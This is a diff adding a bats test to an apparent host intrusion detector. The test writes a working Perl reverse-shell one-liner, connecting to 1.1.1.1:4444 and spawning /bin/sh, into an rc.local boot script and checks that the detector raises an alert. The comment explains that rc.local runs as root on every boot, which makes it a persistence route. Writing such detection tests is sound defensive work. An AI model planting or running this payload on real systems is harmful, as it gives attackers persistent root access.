@@ -320,3 +320,19 @@ seed_benign() {
     run_wd
     cap | grep -qE '"severity":"(alert|warn)"'
 }
+
+@test "INVARIANT (perl -e reverse-shell variant — perl-interpreter-rev-shell axis on boot-script surface)" {
+    # Sister to nc / python -c / curl|bash / dev-tcp boot-script
+    # rev-shell variants already locked. Perl is on every Debian/
+    # Ubuntu host as a dpkg/locale dependency; 'use Socket' produces
+    # a one-liner connect-back PTY just as cleanly as Python. Locks
+    # the perl axis on the T1037 boot-time rc.local root-exec
+    # persistence surface — rc.local runs AS ROOT on every boot,
+    # and a planted perl rev-shell fires every reboot until detected.
+    seed_benign
+    run_wd
+    : > "${SELFDEF_TEST_LOGCAP}"
+    printf '#!/bin/sh\nperl -e "use Socket;\\$i=\\"1.1.1.1\\";\\$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\\"tcp\\"));connect(S,sockaddr_in(\\$p,inet_aton(\\$i)));exec(\\"/bin/sh -i\\");"\n' > "${RCFILE}"
+    run_wd
+    cap | grep -qE '"severity":"(alert|warn)"'
+}
